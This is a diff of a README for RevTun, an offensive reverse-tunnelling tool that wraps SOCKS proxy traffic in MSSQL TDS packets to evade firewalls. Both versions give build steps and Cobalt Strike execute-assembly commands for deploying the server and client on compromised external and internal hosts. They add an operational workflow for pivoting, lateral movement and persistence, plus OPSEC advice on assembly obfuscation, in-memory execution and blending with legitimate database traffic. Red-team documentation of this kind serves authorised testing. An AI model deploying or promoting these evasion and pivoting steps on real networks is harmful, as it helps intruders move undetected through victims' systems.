@@ -1,233 +1,178 @@
 # RevTun - MSSQL Reverse Tunnel
 
-A reverse tunneling tool that disguises network traffic as MSSQL communications using the TDS protocol.
+RevTun is a reverse tunneling tool that disguises network traffic as legitimate MSSQL database communications using the Tabular Data Stream (TDS) protocol. This allows for covert network pivoting and firewall evasion by leveraging the commonly trusted MSSQL port 1433.
 
-## How It Works
+## 🔧 How It Works
 
-Server listens on port 1433 (MSSQL), opens proxy on port 1080 when client connects. Client connects using TDS protocol and proxies traffic to real destinations.
+RevTun operates using a client-server architecture:
 
-## Available Implementations
+1. **Server Component**: Listens on port 1433 (standard MSSQL port) and responds to TDS protocol handshakes
+2. **Client Component**: Connects to the server using authentic MSSQL TDS protocol packets
+3. **Proxy Activation**: When a client connects, the server automatically activates a SOCKS proxy (default port 1080)
+4. **Traffic Tunneling**: All proxy traffic is encapsulated within TDS packets, appearing as legitimate database queries
 
-This project provides two server implementations:
+The result is a fully functional SOCKS proxy that operates through what appears to be normal MSSQL database traffic.
 
-### C# Server (Primary)
-- Full-featured implementation with TLS encryption support
-- Requires .NET 8.0 or later
-- Cross-platform (Windows, Linux, macOS)
+## 🚀 Key Features
 
-### Python Server
-- Lightweight implementation using only Python standard library
-- Compatible with Python 3.7+
-- Ideal for environments where .NET is not available
-- Located in `revtun_server.py`
+- **Protocol Authenticity**: Full TDS protocol implementation with proper handshakes
+- **TLS Encryption**: Optional end-to-end encryption for enhanced security
+- **Multi-Platform**: Supports Windows, Linux, and macOS
+- **Cobalt Strike Ready**: Optimized for `execute-assembly` operations
+- **SOCKS Proxy**: Standard SOCKS5 proxy for tool compatibility
+- **Stealth Operations**: Traffic indistinguishable from legitimate MSSQL connections
 
-## Prerequisites
+## 📋 Prerequisites
 
-### C# Version
-- .NET 8.0 or later
+### C# Implementation (Primary)
+- **.NET 8.0 or later** for cross-platform builds
+- **.NET Framework 4.8** for Cobalt Strike compatibility
+- No external dependencies required
 
-### Python Version  
-- Python 3.7 or later (no additional dependencies required)
+### Python Implementation (Alternative)
+- **Python 3.7+** with standard library only
+- Lightweight option for constrained environments
+- Located in `revtun_server.py` (server only)
 
-## Building
+## 🔨 Building
 
-### C# Server
+### Quick Build (Multi-Platform)
+Use the provided PowerShell script for automated builds:
 
-#### Standard Builds
-```bash
-# compile for windows
-dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true
-
-# compile for linux
-dotnet publish -c Release -r linux-x64 --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true
+```powershell
+# Builds all targets: .NET Framework 4.8, Linux x64, Windows x64
+.\build-multi.ps1
 ```
 
-#### Cobalt Strike execute-assembly Build
-For use with Cobalt Strike's `execute-assembly` command:
+### Manual Builds
 
+#### Cross-Platform Builds (.NET 8.0)
 ```bash
-# Build for .NET Framework 4.8 (recommended for execute-assembly)
+# Windows x64 (self-contained single file)
+dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true
+
+# Linux x64 (self-contained single file)
+dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true
+```
+
+#### Cobalt Strike Build (.NET Framework 4.8)
+```bash
+# Build for execute-assembly compatibility
 dotnet build -c Release -f net48 -p:Platform=AnyCPU
-
-# Alternative: Use the provided build scripts
-# PowerShell
-.\build-cs.ps1
-
-# Batch file
-.\build-cs.bat
 ```
 
-The compiled assembly will be located at: `.\bin\Release\net48\revtun.exe`
+**Output Locations:**
+- **Cobalt Strike**: `.\bin\Release\net48\revtun.exe`
+- **Linux x64**: `.\bin\Release\net8.0\linux-x64\publish\revtun`
+- **Windows x64**: `.\bin\Release\net8.0\win-x64\publish\revtun.exe`
 
-**Important Notes for Cobalt Strike:**
-- The .NET Framework 4.8 build is recommended for better compatibility
-- Test the assembly with `execute-assembly` in a lab environment first
-- Consider using obfuscation tools like ConfuserEx for operational security
-- The assembly is designed to work in-memory without dropping files
+## 🎯 Usage
 
-### Python Server
-No building required - runs directly with Python:
+### Basic Server Setup
 ```bash
-python3 revtun_server.py --help
+# C# Server (recommended)
+./revtun server --port 1433 --proxy-port 1080 --verbose
 ```
 
-## Usage
-
-### Start Server
-
-#### C# Server
+### Client Connection
 ```bash
-dotnet run server
-dotnet run server --port 1435 --proxy-port 8080 --verbose
+# Connect to remote server with encryption
+./revtun client --host server.example.com --port 1433 --encrypt --verbose
 ```
 
-#### Python Server
+## ⚔️ Cobalt Strike Integration
+
+RevTun is optimized for red team operations and Cobalt Strike workflows.
+
+### Deployment Commands
+
+#### Server Deployment (External Host)
 ```bash
-python3 revtun_server.py
-python3 revtun_server.py --port 1435 --proxy-port 8080 --verbose
-```
-
-### Start Client
-```bash
-dotnet run client
-dotnet run client --host server.example.com --port 1435 --debug
-```
-
-### Use Proxy
-```bash
-# HTTP requests
-curl --proxy localhost:1080 http://httpbin.org/ip
-
-# HTTPS requests (TLS/SSL)
-curl --proxy localhost:1080 https://httpbin.org/ip
-```
-
-## Cobalt Strike Usage
-
-### execute-assembly Commands
-
-After building for .NET Framework 4.8, use these commands in Cobalt Strike:
-
-#### Start Server (on compromised host)
-```
-execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --verbose
-```
-
-#### Start Client (to connect back to server)
-```
-execute-assembly revtun.exe client --host [server-ip] --port 1433 --debug
-```
-
-### Operational Considerations
-
-**Network Traffic:**
-- Traffic appears as legitimate MSSQL database connections (TDS protocol)
-- Uses standard port 1433 which is commonly allowed through firewalls
-- TLS encryption available for additional stealth (`--encrypt` flag)
-
-**Deployment Strategy:**
-- Deploy server component on internet-facing compromised host
-- Use client component to establish reverse tunnels from internal networks
-- Proxy port (default 1080) provides SOCKS proxy for further pivoting
-
-**OPSEC Recommendations:**
-- Use `--require-encryption` for encrypted tunnels in sensitive environments
-- Monitor for unusual MSSQL connection patterns in target networks
-- Consider obfuscating the assembly before deployment
-- Test connectivity in lab environment before operational use
-
-### Example Operational Workflow
-```
-# 1. On external compromised server
+# Deploy server on internet-facing compromised host
 execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --require-encryption --verbose
-
-# 2. On internal compromised client  
-execute-assembly revtun.exe client --host external-server-ip --port 1433 --encrypt --debug
-
-# 3. Use the established SOCKS proxy for pivoting
-# The proxy will be available on the server at port 1080
 ```
 
-## Options
+#### Client Connection (Internal Host)
+```bash
+# Connect from internal network back to external server
+execute-assembly revtun.exe client --host [external-server-ip] --port 1433 --encrypt
+```
 
-### Server
-- `--port, -p <port>` - MSSQL server port (default: 1433)
-- `--proxy-port <port>` - Proxy port (default: 1080)
-- `--bind <address>` - Bind address (default: 0.0.0.0)
-- `--verbose, -v` - Enable logging
-- `--require-encryption` - Require TLS encryption for all connections
-- `--no-encryption` - Disable TLS encryption support
+### Operational Workflow
 
-### Client
-- `--host, -h <hostname>` - Server hostname (default: localhost)
-- `--port, -p <port>` - Server port (default: 1433)
-- `--username, -u <user>` - SQL username (default: sa)
-- `--verbose, -v` - Enable logging
-- `--debug` - Enable debug output and interactive SQL session
-- `--encrypt` - Request TLS encryption
-- `--require-encryption` - Require TLS encryption (fail if not supported)
+1. **Deploy Server**: Use `execute-assembly` to deploy server on external compromised host
+2. **Establish Tunnel**: Connect clients from internal networks using reverse connection
+3. **Pivot & Lateral Movement**: Use SOCKS proxy for further network access
+4. **Maintain Persistence**: TDS traffic blends with legitimate database communications
 
-## Encryption Support
+### OPSEC Considerations
 
-RevTun now supports encrypted MSSQL tunnels using TLS/SSL encryption:
+**✅ Advantages:**
+- Traffic appears as legitimate MSSQL database connections
+- Uses standard port 1433 (commonly allowed through firewalls)
+- TLS encryption available for additional security
+- Minimal network signatures
 
-### Server Encryption Options
-- **Default**: Supports encryption if client requests it
-- `--require-encryption`: Forces all connections to use TLS encryption
-- `--no-encryption`: Disables encryption support entirely
+**⚠️ Considerations:**
+- Monitor for unusual MSSQL connection patterns
+- Consider assembly obfuscation for enhanced evasion
+- Test connectivity in lab environment first
+- Use encryption in sensitive environments
 
-### Client Encryption Options
-- **Default**: No encryption requested (plaintext tunnel)
-- `--encrypt`: Requests TLS encryption from server
-- `--require-encryption`: Requires TLS encryption (connection fails if server doesn't support it)
+## 🔐 Encryption & Security
 
-### Examples with Encryption
+RevTun supports multiple security modes for different operational requirements.
+
+### Server Encryption Modes
+
+| Mode | Command | Description |
+|------|---------|-------------|
+| **Mixed** (Default) | `--verbose` | Accepts both encrypted and plaintext connections |
+| **Required** | `--require-encryption` | Forces TLS encryption for all connections |
+| **Disabled** | `--no-encryption` | Disables encryption support entirely |
+
+### Client Encryption Modes
+
+| Mode | Command | Description |
+|------|---------|-------------|
+| **Plaintext** (Default) | `--verbose` | No encryption requested |
+| **Requested** | `--encrypt` | Requests TLS encryption from server |
+| **Required** | `--require-encryption` | Requires TLS encryption (fails if unavailable) |
+
+### Encryption Examples
+
 ```bash
 # Server requiring encryption
-dotnet run server --require-encryption --verbose
+./revtun server --require-encryption --verbose
 
-# Client requesting encryption (silent mode)
-dotnet run client --encrypt --host server.example.com
-
-# Client with debug output and encryption
-dotnet run client --encrypt --debug --host server.example.com
+# Client with optional encryption
+./revtun client --encrypt --host server.example.com
 
 # Client requiring encryption
-dotnet run client --require-encryption --host server.example.com
+./revtun client --require-encryption --host server.example.com --verbose
 ```
 
-The encryption uses industry-standard TLS and protects both the tunnel traffic and the encapsulated data.
+## 📊 Command Line Options
 
-## Testing
+### Server Options
 
-### Python Server Testing
-A test script is provided to verify the Python server implementation:
+| Option | Short | Default | Description |
+|--------|-------|---------|-------------|
+| `--port` | `-p` | `1433` | MSSQL server port |
+| `--proxy-port` | | `1080` | SOCKS proxy port |
+| `--bind` | | `0.0.0.0` | Bind address |
+| `--verbose` | `-v` | `false` | Enable verbose logging |
+| `--require-encryption` | | `false` | Require TLS for all connections |
+| `--no-encryption` | | `false` | Disable encryption support |
 
-```bash
-# Start the Python server in one terminal
-python3 revtun_server.py --verbose
+### Client Options
 
-# Run the test script in another terminal
-python3 test_python_server.py
-```
-
-The test script verifies:
-- TDS protocol handshake (Pre-Login and Login)
-- Proxy listener activation
-- Basic HTTP CONNECT proxy functionality
-
-## Client Operation Modes
-
-- **Silent Mode** (default): Client runs silently in background, only outputs errors
-- **Debug Mode** (`--debug`): Shows connection details, tunnel activity, and interactive SQL session  
-- **Verbose Mode** (`--verbose`): Technical logging for troubleshooting (implied by `--debug`)
-
-## Security Notes
-
-RevTun now supports TLS encryption for enhanced security:
-
-- **Plaintext Mode**: Basic TDS protocol obfuscation (legacy compatibility)
-- **Encrypted Mode**: Full TLS encryption of tunnel traffic and data
-- **Mixed Mode**: Server can accept both encrypted and plaintext connections (default)
-
-When encryption is enabled, all traffic including tunnel data is protected by TLS.
+| Option | Short | Default | Description |
+|--------|-------|---------|-------------|
+| `--host` | `-h` | `localhost` | Server hostname |
+| `--port` | `-p` | `1433` | Server port |
+| `--username` | `-u` | `sa` | SQL username (for TDS handshake) |
+| `--verbose` | `-v` | `false` | Enable verbose logging |
+| `--debug` | | `false` | Enable debug output + interactive session |
+| `--encrypt` | | `false` | Request TLS encryption |
+| `--require-encryption` | | `false` | Require TLS encryption |
